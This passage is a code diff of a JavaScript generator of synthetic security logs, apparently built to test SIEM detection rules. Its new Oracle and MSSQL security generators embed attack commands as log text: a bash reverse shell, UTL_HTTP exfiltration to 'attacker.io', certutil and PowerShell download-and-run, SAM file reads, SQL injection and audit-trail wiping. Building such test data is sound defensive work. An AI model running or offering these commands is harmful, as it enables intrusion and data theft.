@@ -29,39 +29,48 @@ function setPool(size, prefix=null) {
 }
 // Per-vendor pool caps: null = fully random, number = hard cap on unique hostnames/IPs/users
 const VENDOR_POOL = {
-  fortinet: { low: 2,   med: 4,   high: 8    },
-  paloalto: { low: 2,   med: 4,   high: 8    },
-  switch:   { low: 3,   med: 5,   high: 8    },
-  email:    { low: 20,  med: 50,  high: 100  },
-  endpoint: { low: 10,  med: 50,  high: null },
-  windows:  { low: 8,   med: 40,  high: null },
-  linux:    { low: 5,   med: 15,  high: null },
-  oracle:   { low: 4,   med: 6,   high: 8    },
-  mssql:    { low: 4,   med: 6,   high: 8    },
+  fortinet: { low: 4,   med: 8,   high: 16   },
+  paloalto: { low: 4,   med: 8,   high: 16   },
+  switch:   { low: 6,   med: 10,  high: 16   },
+  email:    { low: 40,  med: 100, high: 200  },
+  endpoint: { low: 20,  med: 100, high: null },
+  windows:  { low: 16,  med: 80,  high: null },
+  linux:    { low: 10,  med: 30,  high: null },
+  oracle:      { low: 8,   med: 12,  high: 16   },
+  mssql:       { low: 8,   med: 12,  high: 16   },
+  cloudtrail:  { low: 20,  med: 50,  high: 100  },
+  okta:        { low: 10,  med: 30,  high: 80   },
+  crowdstrike: { low: 10,  med: 30,  high: 80   },
+  wdns:        { low: 10,  med: 30,  high: null },
 };
 const VENDOR_RND_DEFAULT = {
   fortinet: 'med', paloalto: 'med', switch: 'low',
   email: 'med', endpoint: 'high', windows: 'med', linux: 'med',
   oracle: 'med', mssql: 'med',
+  cloudtrail: 'med', okta: 'med', crowdstrike: 'med', wdns: 'med',
 };
 const VENDOR_LOG_COUNT = {
-  fortinet: { low: 100, med: 250, high: 500  },
-  paloalto: { low: 100, med: 250, high: 500  },
-  switch:   { low: 50,  med: 150, high: 300  },
-  email:    { low: 20,  med: 50,  high: 100  },
-  endpoint: { low: 100, med: 300, high: 1000 },
-  windows:  { low: 100, med: 300, high: 1000 },
-  linux:    { low: 150, med: 500, high: 1500 },
-  oracle:   { low: 80,  med: 250, high: 800  },
-  mssql:    { low: 80,  med: 250, high: 800  },
+  fortinet: { low: 200, med: 500,  high: 1000 },
+  paloalto: { low: 200, med: 500,  high: 1000 },
+  switch:   { low: 100, med: 300,  high: 600  },
+  email:    { low: 40,  med: 100,  high: 200  },
+  endpoint: { low: 200, med: 600,  high: 2000 },
+  windows:  { low: 200, med: 600,  high: 2000 },
+  linux:    { low: 300, med: 1000, high: 3000 },
+  oracle:      { low: 160, med: 500,  high: 1600 },
+  mssql:       { low: 160, med: 500,  high: 1600 },
+  cloudtrail:  { low: 200, med: 600,  high: 2000 },
+  okta:        { low: 100, med: 300,  high: 1000 },
+  crowdstrike: { low: 100, med: 300,  high: 1000 },
+  wdns:        { low: 200, med: 600,  high: 2000 },
 };
 // Per Windows log type min counts by randomness level
 const WIN_TYPE_LOG_COUNT = {
-  security:    { low: 60,  med: 150, high: 500 },
-  application: { low: 20,  med: 50,  high: 150 },
-  system:      { low: 20,  med: 50,  high: 150 },
-  applocker:   { low: 15,  med: 40,  high: 100 },
-  powershell:  { low: 15,  med: 40,  high: 150 },
+  security:    { low: 120, med: 300, high: 1000 },
+  application: { low: 40,  med: 100, high: 300  },
+  system:      { low: 40,  med: 100, high: 300  },
+  applocker:   { low: 30,  med: 80,  high: 200  },
+  powershell:  { low: 30,  med: 80,  high: 300  },
 };
 const WIN_TYPES_DEFAULT = ['security','application','system'];
 const randomHostname = () => _pool ? pick(_pool.hostnames) : _hostnamePrefix ? `${_hostnamePrefix}-${rand(1,999).toString().padStart(3,'0')}` : _HOSTNAMES_BASE();
@@ -204,6 +213,46 @@ function genWinAccountMgmt(ts){
   const actions={4720:'user-account-created',4722:'user-account-enabled',4724:'password-reset',4726:'user-account-deleted',4728:'added-member-to-security-group',4732:'added-member-to-local-group'};
   return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,TargetDomainName:domain,SubjectUserName:pick(_USERS_LIST),SubjectDomainName:domain}},event:{code:String(eid),action:actions[eid]||'account-management',category:['iam'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
 }
+// ─── Windows Security Extra (Elastic prebuilt rule targets) ───────────────────
+// Covers event IDs that Elastic's built-in detection rules specifically query:
+//   4648 Explicit credential logon (RunAs / lateral movement)
+//   4672 Special privileges assigned (SeDebugPrivilege / LSASS access)
+//   4697 Service installed via Security channel (persistence)
+//   4698/4702 Scheduled task created/modified (persistence)
+//   1102 Security audit log cleared (defence evasion)
+//   4769 Kerberos service ticket with RC4 (Kerberoasting)
+//   4771 Kerberos pre-auth failed (password spray)
+function genWinSecurityExtra(ts){
+  const r=Math.random();
+  const hn=randomHostname(),user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
+  if(r<0.14){
+    // 4648 - Explicit credential logon (RunAs / lateral movement)
+    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4648,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:randomUser(),SubjectDomainName:domain,TargetUserName:user,TargetDomainName:domain,TargetServerName:randomHostname(),ProcessName:`C:\\Windows\\System32\\${pick(['runas.exe','cmd.exe','powershell.exe'])}`}},event:{code:'4648',action:'explicit-credentials-logon',category:['authentication'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+  }else if(r<0.28){
+    // 4672 - Special privileges assigned (SeDebugPrivilege indicates potential LSASS access)
+    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4672,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:user,SubjectDomainName:domain,SubjectLogonId:`0x${randomHex(8)}`,PrivilegeList:pick(['SeDebugPrivilege\nSeImpersonatePrivilege','SeTcbPrivilege\nSeAssignPrimaryTokenPrivilege','SeBackupPrivilege\nSeRestorePrivilege'])}},event:{code:'4672',action:'special-privileges-logon',category:['authentication'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+  }else if(r<0.42){
+    // 4697 - Service installed (persistence rule trigger)
+    const svc=pick(['WindowsUpdate32','TelemetryHub','DiagnosticsAgent','winsrv64','svchost_upd']);
+    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4697,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:user,SubjectDomainName:domain,ServiceName:svc,ServiceFileName:pick([`C:\\Windows\\Temp\\${svc}.exe`,`C:\\ProgramData\\${svc}\\${svc}.dll`,`%SYSTEMROOT%\\system32\\${svc}.exe`]),ServiceType:'0x10',ServiceStartType:'2',ServiceAccount:'LocalSystem'}},event:{code:'4697',action:'service-installed',category:['process'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+  }else if(r<0.57){
+    // 4698/4702 - Scheduled task created or modified (persistence)
+    const eid=Math.random()<0.7?4698:4702;
+    const task=pick(['UpdateCheck','TelemetryAgent','MaintenanceRun','schtask_persist','SystemCleanup']);
+    const cmd=pick(['C:\\Windows\\Temp\\update.exe','powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn','cmd /c net user admin$ /add','wscript.exe C:\\ProgramData\\evil.vbs','%SYSTEMROOT%\\system32\\cmd.exe /c whoami /all > C:\\temp\\info.txt']);
+    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:user,SubjectDomainName:domain,TaskName:`\\Microsoft\\Windows\\${task}`,TaskContent:`<Task><Actions><Exec><Command>${cmd}</Command></Exec></Actions></Task>`}},event:{code:String(eid),action:eid===4698?'scheduled-task-created':'scheduled-task-modified',category:['process'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+  }else if(r<0.67){
+    // 1102 - Security audit log cleared (defence evasion)
+    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:1102,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{SubjectUserName:user,SubjectDomainName:domain,SubjectLogonId:`0x${randomHex(8)}`}},event:{code:'1102',action:'audit-log-cleared',category:['configuration'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+  }else if(r<0.84){
+    // 4769 - Kerberos service ticket request with RC4 (0x17) = Kerberoasting indicator
+    const spn=pick(['MSSQLSvc/sql-prod-01.corp.local:1433','HTTP/webapp.corp.local:80','HOST/dc01.corp.local','CIFS/fileserver.corp.local']);
+    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4769,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,TargetDomainName:domain,ServiceName:spn,TicketEncryptionType:'0x17',TicketOptions:'0x40810000',IpAddress:randomIP(),Status:'0x0'}},event:{code:'4769',action:'kerberos-service-ticket-requested',category:['authentication'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+  }else{
+    // 4771 - Kerberos pre-authentication failed (password spray / brute force)
+    return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4771,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,PreAuthType:'2',IpAddress:randomIP(),Status:pick(['0x12','0x18','0x25','0x6'])}},event:{code:'4771',action:'kerberos-preauth-failed',category:['authentication'],outcome:'failure',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+  }
+}
 function genWinApplication(ts){
   const eid=pick([1000,1001,1002,11707,11708]);
   const app=pick(['MicrosoftEdge.exe','OUTLOOK.EXE','chrome.exe','Teams.exe','explorer.exe','svchost.exe']);
@@ -237,7 +286,7 @@ function genWinPS(ts){
 }
 function generateWindowsEventLogs(count,tr,types=WIN_TYPES_DEFAULT){
   const gens=[];
-  if(types.includes('security'))gens.push(genWinSecurity,genWinSecurity,genWinAccountMgmt);
+  if(types.includes('security'))gens.push(genWinSecurity,genWinSecurity,genWinAccountMgmt,genWinSecurityExtra);
   if(types.includes('application'))gens.push(genWinApplication);
   if(types.includes('system'))gens.push(genWinSystem);
   if(types.includes('applocker'))gens.push(genWinAppLocker);
@@ -339,11 +388,11 @@ const SSH_ATTACK_IPS=Object.keys(SSH_ATTACK_GEO);
 const sshGeoFor=ip=>{const g=SSH_ATTACK_GEO[ip];if(!g)return null;const[c,cn,ci,cont,lat,lon]=g;return{country_iso_code:c,country_name:cn,city_name:ci,continent_name:cont,location:{lat:+(lat+(Math.random()-0.5)*0.4).toFixed(4),lon:+(lon+(Math.random()-0.5)*0.4).toFixed(4)}}};
 
 const LINUX_TYPE_LOG_COUNT={
-  ssh:      {low:60, med:200,high:600},
-  sudo:     {low:25, med:80, high:250},
-  usermgmt: {low:15, med:60, high:200},
-  auditd:   {low:25, med:80, high:250},
-  cron:     {low:15, med:40, high:100},
+  ssh:      {low:120, med:400, high:1200},
+  sudo:     {low:50,  med:160, high:500},
+  usermgmt: {low:30,  med:120, high:400},
+  auditd:   {low:50,  med:160, high:500},
+  cron:     {low:30,  med:80,  high:200},
 };
 const LINUX_TYPES_DEFAULT=['ssh','sudo','usermgmt','auditd','cron'];
 const LINUX_TYPE_LABELS={ssh:'SSH',sudo:'Sudo',usermgmt:'User Mgmt',auditd:'Auditd',cron:'Cron'};
@@ -356,9 +405,9 @@ const ORACLE_ERROR_CODES=['ORA-00001','ORA-00060','ORA-01017','ORA-01555','ORA-0
 const ORACLE_ERROR_MSGS={'ORA-00001':'unique constraint violated','ORA-00060':'Deadlock detected. See Note 60.1 at My Oracle Support for help.','ORA-01017':'invalid username/password; logon denied','ORA-01555':'snapshot too old: rollback segment number with name "" too small','ORA-04031':'unable to allocate bytes of shared memory','ORA-12170':'TNS:Connect timeout occurred','ORA-28000':'the account is locked','ORA-00942':'table or view does not exist'};
 const ORACLE_SERVICE_NAMES=['ORCL','ORCLPDB1','SALES_PDB','HR_PDB','REPORTS_PDB'];
 const ORACLE_DBIDS=['1234567890','2345678901','3456789012','4567890123'];
-const ORACLE_TYPE_LOG_COUNT={audit:{low:30,med:100,high:300},alert:{low:20,med:60,high:200},listener:{low:20,med:60,high:200},metrics:{low:10,med:30,high:100}};
-const ORACLE_TYPES_DEFAULT=['audit','alert','listener','metrics'];
-const ORACLE_TYPE_LABELS={audit:'Audit',alert:'Alert Log',listener:'Listener',metrics:'Metrics'};
+const ORACLE_TYPE_LOG_COUNT={audit:{low:50,med:160,high:500},alert:{low:40,med:120,high:400},listener:{low:40,med:120,high:400},metrics:{low:20,med:60,high:200},security:{low:30,med:100,high:300}};
+const ORACLE_TYPES_DEFAULT=['audit','alert','listener','metrics','security'];
+const ORACLE_TYPE_LABELS={audit:'Audit',alert:'Alert Log',listener:'Listener',metrics:'Metrics',security:'Security Events'};
 const oracleIsoTs=d=>d.toISOString().replace(/(\.\d{3})Z$/,(_,ms)=>ms+'000+00:00');
 const oracleListenerTs=d=>{const m=['JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC'];return`${String(d.getUTCDate()).padStart(2,'0')}-${m[d.getUTCMonth()]}-${d.getUTCFullYear()} ${String(d.getUTCHours()).padStart(2,'0')}:${String(d.getUTCMinutes()).padStart(2,'0')}:${String(d.getUTCSeconds()).padStart(2,'0')}`;};
 
@@ -370,9 +419,44 @@ const MSSQL_TABLES=['dbo.Employees','dbo.Orders','dbo.Customers','dbo.SalesHisto
 const MSSQL_ERROR_CODES={18456:'Login failed for user',208:'Invalid object name',547:'Constraint violation',1205:'Transaction was deadlocked',8152:'String or binary data would be truncated'};
 const MSSQL_AUDIT_ACTIONS=['SL','IN','UP','DL','EX','AU','LO'];
 const MSSQL_AUDIT_ACTION_LABELS={SL:'SELECT',IN:'INSERT',UP:'UPDATE',DL:'DELETE',EX:'EXECUTE',AU:'AUDIT_CHANGE',LO:'LOGOUT'};
-const MSSQL_TYPE_LOG_COUNT={audit:{low:25,med:80,high:250},errorlog:{low:25,med:80,high:250},translog:{low:30,med:100,high:300},agent:{low:15,med:40,high:150},metrics:{low:10,med:30,high:100}};
-const MSSQL_TYPES_DEFAULT=['audit','errorlog','translog','agent','metrics'];
-const MSSQL_TYPE_LABELS={audit:'Audit',errorlog:'Error Log',translog:'Transaction Log',agent:'SQL Agent',metrics:'Metrics'};
+const MSSQL_TYPE_LOG_COUNT={audit:{low:50,med:160,high:500},errorlog:{low:50,med:160,high:500},translog:{low:60,med:200,high:600},agent:{low:30,med:80,high:300},metrics:{low:20,med:60,high:200},security:{low:30,med:100,high:300}};
+const MSSQL_TYPES_DEFAULT=['audit','errorlog','translog','agent','metrics','security'];
+const MSSQL_TYPE_LABELS={audit:'Audit',errorlog:'Error Log',translog:'Transaction Log',agent:'SQL Agent',metrics:'Metrics',security:'Security Events'};
+// ─── AWS CloudTrail constants ─────────────────────────────────────────────────
+const CT_ACCOUNTS=['123456789012','234567890123','345678901234'];
+const CT_REGIONS=['us-east-1','us-west-2','eu-west-1','ap-southeast-1','us-east-2','eu-central-1','ap-northeast-1'];
+const CT_TYPE_LOG_COUNT={management:{low:80,med:200,high:600},iam:{low:40,med:120,high:400},s3_data:{low:60,med:200,high:800},security:{low:20,med:60,high:200}};
+const CT_TYPES_DEFAULT=['management','iam','s3_data','security'];
+const CT_TYPE_LABELS={management:'Management',iam:'IAM',s3_data:'S3 Data',security:'Security'};
+// ─── Okta constants ───────────────────────────────────────────────────────────
+const OKTA_APPS=['Office365','Salesforce','Slack','Zoom','GitHub Enterprise','AWS SSO','Jira','ServiceNow'];
+const OKTA_TYPE_LOG_COUNT={auth:{low:60,med:200,high:600},lifecycle:{low:30,med:100,high:300},policy:{low:20,med:60,high:200},app:{low:20,med:60,high:200}};
+const OKTA_TYPES_DEFAULT=['auth','lifecycle','policy','app'];
+const OKTA_TYPE_LABELS={auth:'Authentication',lifecycle:'User Lifecycle',policy:'Policy',app:'Application'};
+// ─── CrowdStrike constants ────────────────────────────────────────────────────
+const CS_HOSTS=['DESKTOP-CS001','LAPTOP-EXEC017','WS-DEV-042','SRV-APP-003','LAPTOP-SALES-019','DC-CORP-01','WORKSTATION-099'];
+const CS_HOST_INFO={
+  'DESKTOP-CS001':   {aid:'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', sensorVersion:'7.14.16703.0', os:{name:'Windows 10',family:'windows',version:'10.0.19044',platform:'windows'}, ip:'10.0.1.11'},
+  'LAPTOP-EXEC017':  {aid:'b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5', sensorVersion:'7.15.17302.0', os:{name:'Windows 11',family:'windows',version:'10.0.22621',platform:'windows'}, ip:'10.0.1.17'},
+  'WS-DEV-042':      {aid:'c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6', sensorVersion:'7.14.16703.0', os:{name:'Windows 10',family:'windows',version:'10.0.19045',platform:'windows'}, ip:'10.0.2.42'},
+  'SRV-APP-003':     {aid:'d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1', sensorVersion:'7.15.17302.0', os:{name:'Windows Server 2022',family:'windows',version:'10.0.20348',platform:'windows'}, ip:'10.0.3.3'},
+  'LAPTOP-SALES-019':{aid:'e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2', sensorVersion:'7.13.15801.0', os:{name:'Windows 11',family:'windows',version:'10.0.22631',platform:'windows'}, ip:'10.0.1.19'},
+  'DC-CORP-01':      {aid:'f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3', sensorVersion:'7.15.17302.0', os:{name:'Windows Server 2019',family:'windows',version:'10.0.17763',platform:'windows'}, ip:'10.0.0.1'},
+  'WORKSTATION-099': {aid:'a7b8c9d0e1f2a7b8c9d0e1f2a7b8c9d0', sensorVersion:'7.13.15801.0', os:{name:'Windows 10',family:'windows',version:'10.0.19041',platform:'windows'}, ip:'10.0.2.99'},
+};
+const CS_TACTICS=['Execution','Persistence','Privilege Escalation','Defense Evasion','Credential Access','Discovery','Lateral Movement','Exfiltration','Command and Control'];
+const CS_TECHNIQUES=['PowerShell','Scheduled Task/Job','DLL Side-Loading','Credential Dumping','Network Share Discovery','Pass the Hash','Process Injection'];
+const CS_DETECT_NAMES=['Suspicious PowerShell Execution','Credential Dumping Tool Detected','Lateral Movement via PsExec','Ransomware Behavior Detected','Privilege Escalation via Token Impersonation','Process Injection Detected','Cobalt Strike Beacon Activity'];
+const CS_TYPE_LOG_COUNT={process:{low:60,med:200,high:600},network:{low:40,med:120,high:400},detections:{low:30,med:100,high:300},dns:{low:40,med:120,high:400},vulnerability:{low:20,med:60,high:200},alerts:{low:20,med:60,high:200},host:{low:7,med:7,high:7}};
+const CS_TYPES_DEFAULT=['process','network','detections','dns','vulnerability','alerts','host'];
+const CS_TYPE_LABELS={process:'Process',network:'Network',detections:'Detections',dns:'DNS',vulnerability:'Vulnerability',alerts:'Alerts',host:'Host Inventory'};
+// ─── Windows DNS & AD constants ───────────────────────────────────────────────
+const AD_DC_HOSTS=['DC01','DC02','ADDC-NYC-01','ADDC-LON-01','PDC-CORP-01'];
+const AD_DOMAINS=['corp.local','contoso.local','fabrikam.local','acme.local'];
+const adDomain=()=>pick(AD_DOMAINS);
+const WDNS_TYPE_LOG_COUNT={dns:{low:80,med:300,high:1000},kerberos:{low:60,med:200,high:600},ldap:{low:40,med:120,high:400},changes:{low:20,med:60,high:200}};
+const WDNS_TYPES_DEFAULT=['dns','kerberos','ldap','changes'];
+const WDNS_TYPE_LABELS={dns:'DNS Queries',kerberos:'Kerberos',ldap:'LDAP',changes:'AD Changes'};
 const mssqlTs=d=>{const dt=d.toISOString().split('T')[0];const hh=String(d.getUTCHours()).padStart(2,'0');const mm=String(d.getUTCMinutes()).padStart(2,'0');const ss=String(d.getUTCSeconds()).padStart(2,'0');const cs=String(Math.floor(d.getUTCMilliseconds()/10)).padStart(2,'0');return`${dt} ${hh}:${mm}:${ss}.${cs}`;};
 
 function genSSH(ts){
@@ -473,14 +557,80 @@ function genOracleMetrics(ts){
   const host=pick(ORACLE_HOSTS);
   return JSON.stringify({'@timestamp':oracleIsoTs(ts),host:{name:host,hostname:host},oracle:{performance:{db_time_ms:rand(1000,50000),physical_reads:rand(0,5000),logical_reads:rand(5000,200000),hard_parses:rand(0,500),soft_parses:rand(500,10000),redo_size_bytes:rand(100000,10000000),sessions_active:rand(10,500),sessions_inactive:rand(0,100),wait_time:{db_file_sequential_read_ms:rand(0,2000),log_file_sync_ms:rand(0,500),buffer_busy_waits_ms:rand(0,200),latch_free_ms:rand(0,50)}}},event:{dataset:'oracle.performance',module:'oracle',kind:'metric'}});
 }
+function genOracleSecurity(ts){
+  const r=Math.random(),host=pick(ORACLE_HOSTS),clientIp=randomIP(),dbid=pick(ORACLE_DBIDS),port=rand(1024,65535);
+  const addr=`(ADDRESS=(PROTOCOL=tcp)(HOST=${clientIp})(PORT=${port}))`;
+  let user=pick(ORACLE_USERS),action,sql,status='0';
+  if(r<0.13){
+    action='SELECT';
+    sql=pick([
+      `SELECT * FROM HR.EMPLOYEES WHERE ID=1 UNION SELECT USERNAME,PASSWORD_VERSIONS,NULL,NULL,NULL FROM DBA_USERS--`,
+      `SELECT * FROM OE.ORDERS WHERE ORDER_ID=1 OR 1=1--`,
+      `SELECT UTL_HTTP.REQUEST('http://10.10.10.50/exfil?data='||LISTAGG(USERNAME,',') WITHIN GROUP (ORDER BY 1)) FROM DBA_USERS`,
+      `SELECT * FROM HR.EMPLOYEES WHERE LAST_NAME=''--' OR '1'='1`,
+    ]);
+  } else if(r<0.27){
+    action='SELECT';
+    sql=pick([
+      `SELECT USERNAME,ACCOUNT_STATUS,PASSWORD_VERSIONS FROM DBA_USERS`,
+      `SELECT GRANTEE,GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE ADMIN_OPTION='YES'`,
+      `SELECT VALUE FROM V$PARAMETER WHERE NAME='audit_trail'`,
+      `SELECT * FROM V$SESSION WHERE TYPE='USER'`,
+      `SELECT OWNER,OBJECT_NAME FROM DBA_OBJECTS WHERE OBJECT_TYPE='TABLE' AND ROWNUM<=500`,
+      `SELECT GRANTEE,PRIVILEGE FROM DBA_SYS_PRIVS WHERE PRIVILEGE='DBA'`,
+    ]);
+  } else if(r<0.40){
+    action='EXECUTE';
+    sql=pick([
+      `GRANT DBA TO ${user}`,
+      `GRANT EXECUTE ON UTL_HTTP TO ${user}`,
+      `GRANT EXECUTE ON UTL_FILE TO ${user}`,
+      `EXEC DBMS_SCHEDULER.CREATE_JOB(job_name=>'SYS_UPDATE',job_type=>'EXECUTABLE',job_action=>'/bin/sh -c "bash -i >& /dev/tcp/${clientIp}/4444 0>&1"',enabled=>TRUE)`,
+      `EXEC SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA('CTXSYS','CONTEXT','SYS.DBMS_EXPORT_EXTENSION.DISP_SQL_STMT(''GRANT DBA TO ${user.toLowerCase()}'')',1,'1',0)`,
+    ]);
+    status=Math.random()<0.3?pick(['1031','1017']):'0';
+  } else if(r<0.52){
+    action='EXECUTE';
+    sql=pick([
+      `SELECT UTL_HTTP.REQUEST('http://192.168.100.50:8080/exfil?d='||UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(EMAIL||CHR(58)||TO_CHAR(SALARY))))) FROM HR.EMPLOYEES FETCH FIRST 50 ROWS ONLY`,
+      `SELECT UTL_HTTP.REQUEST('http://attacker.io/c2?host='||SYS_CONTEXT('USERENV','SERVER_HOST')) FROM DUAL`,
+      `EXEC UTL_HTTP.SET_PROXY('http://${clientIp}:3128','')`,
+    ]);
+  } else if(r<0.63){
+    action='SELECT';
+    sql=pick([
+      `CREATE DATABASE LINK priv_link CONNECT TO SYSTEM IDENTIFIED BY "Oracle123" USING '${clientIp}:1521/ORCL'`,
+      `SELECT * FROM HR.EMPLOYEES@priv_link`,
+      `SELECT * FROM ALL_DB_LINKS`,
+    ]);
+  } else if(r<0.75){
+    action='LOGON';
+    user=pick(['SYS','SYSTEM','ADMIN','DBA','ORACLE','SA','DBSNMP']);
+    status=pick(['1017','1017','28000','28001']);
+    sql='';
+  } else if(r<0.86){
+    action='DELETE';
+    sql=pick([
+      `DELETE FROM SYS.AUD$ WHERE TIMESTAMP# < SYSDATE-1`,
+      `NOAUDIT ALL`,
+      `ALTER SYSTEM SET AUDIT_TRAIL=NONE SCOPE=SPFILE`,
+      `EXEC DBMS_AUDIT_MGMT.CLEAR_AUDIT_TRAIL(DBMS_AUDIT_MGMT.AUDIT_TRAIL_ALL,TRUE)`,
+    ]);
+  } else {
+    action='EXECUTE';
+    sql=`EXEC DBMS_SCHEDULER.CREATE_JOB(job_name=>'WIN_UPDATE',job_type=>'PLSQL_BLOCK',job_action=>'BEGIN EXECUTE IMMEDIATE ''GRANT DBA TO ${user.toLowerCase()}''; END;',repeat_interval=>'FREQ=DAILY',enabled=>TRUE)`;
+  }
+  return`${oracleIsoTs(ts)} LENGTH: "200" ACTION :[${action.length}] "${action}" DATABASE USER:[${user.length}] "${user}" PRIVILEGE :[4] "NONE" CLIENT USER:[6] "oracle" STATUS:[${status.length}] "${status}" CLIENT ADDRESS:[${addr.length}] "${addr}" USERHOST:[${host.length}] "${host}.corp" DBID:[10] "${dbid}" SQLTEXT:[${sql.length}] "${sql}"`;
+}
+
 function generateOracleLogs(count,tr,types=ORACLE_TYPES_DEFAULT){
   const active=types.length?types:ORACLE_TYPES_DEFAULT;
-  const W={audit:35,alert:25,listener:25,metrics:15};
+  const W={audit:30,alert:20,listener:20,metrics:15,security:15};
   const filtered=Object.entries(W).filter(([t])=>active.includes(t));
   const total=filtered.reduce((s,[,w])=>s+w,0);
   return generateTimestamps(count,tr).map(ts=>{
     let r=Math.random()*total,cum=0;
-    for(const[t,w]of filtered){cum+=w;if(r<cum)return t==='audit'?genOracleAudit(ts):t==='alert'?genOracleAlert(ts):t==='listener'?genOracleListener(ts):genOracleMetrics(ts);}
+    for(const[t,w]of filtered){cum+=w;if(r<cum)return t==='audit'?genOracleAudit(ts):t==='alert'?genOracleAlert(ts):t==='listener'?genOracleListener(ts):t==='security'?genOracleSecurity(ts):genOracleMetrics(ts);}
     return genOracleMetrics(ts);
   });
 }
@@ -526,16 +676,361 @@ function genMSSQLMetrics(_ts){
   const ts=tsdbNow();
   return JSON.stringify({'@timestamp':ts.toISOString(),host:{name:host,hostname:host},mssql:{metrics:{server_name:host,instance_name:'MSSQLSERVER',batch_requests_sec:rand(100,10000),user_connections:rand(5,500),buffer_cache_hit_ratio:rand(85,100),page_life_expectancy_sec:rand(300,86400),lock_waits_per_sec:rand(0,200),deadlocks_per_sec:rand(0,10),range_scans_per_sec:rand(0,500),target_server_memory_kb:rand(2097152,67108864),total_server_memory_kb:rand(1048576,67108864)}},event:{dataset:'mssql.performance',module:'mssql',kind:'metric'}});
 }
+function genMSSQLSecurity(ts){
+  const r=Math.random(),user=pick(MSSQL_USERS),db=pick(MSSQL_DATABASES),clientIp=randomIP(),sid=rand(1,255);
+  let action='EX',actionLabel='EXECUTE',stmt='',succeeded=true,objName='';
+  if(r<0.15){
+    objName='xp_cmdshell';
+    stmt=pick([
+      `EXEC xp_cmdshell 'whoami'`,
+      `EXEC xp_cmdshell 'net user hacker P@ssw0rd123 /add'`,
+      `EXEC xp_cmdshell 'powershell -enc ${randomHex(80)}'`,
+      `EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.10.50/svhost.exe C:\\Windows\\Temp\\svhost.exe && C:\\Windows\\Temp\\svhost.exe'`,
+      `EXEC xp_cmdshell 'cmd /c net localgroup administrators hacker /add'`,
+    ]);
+  } else if(r<0.28){
+    objName='sp_configure';
+    stmt=pick([
+      `EXEC sp_configure 'show advanced options', 1; RECONFIGURE`,
+      `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE WITH OVERRIDE`,
+      `EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE`,
+      `EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE`,
+    ]);
+  } else if(r<0.38){
+    objName='sp_OACreate';
+    stmt=pick([
+      `DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUT; EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(''http://${clientIp}/s'')'`,
+      `DECLARE @o INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @o OUT; EXEC sp_OAMethod @o, 'OpenTextFile', NULL, 'C:\\Windows\\System32\\drivers\\etc\\hosts', 1`,
+    ]);
+  } else if(r<0.48){
+    action='SL'; actionLabel='SELECT'; objName='OPENROWSET';
+    stmt=pick([
+      `SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\config\\SAM', SINGLE_BLOB) AS x`,
